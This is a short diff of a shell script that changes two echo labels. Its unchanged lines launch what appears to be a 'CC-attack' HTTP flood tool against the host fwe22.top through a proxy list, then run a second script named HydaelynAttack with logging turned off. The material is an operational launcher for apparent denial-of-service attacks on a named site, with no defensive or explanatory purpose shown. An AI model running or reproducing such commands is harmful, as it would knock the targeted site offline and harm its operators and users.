@@ -18,9 +18,9 @@ git pull
 cd ..
 
 echo ""
-echo "CC-attack"
+echo "updata CC-attack"
 python3 CC-attack/cc.py -url http://fwe22.top/ -f proxy.txt -v 5 -s 30
 
 echo ""
-echo "HydaelynAttack"
+echo "updata HydaelynAttack"
 python3 HydaelynAttack/HydaelynAttack_p_once_noLog.py
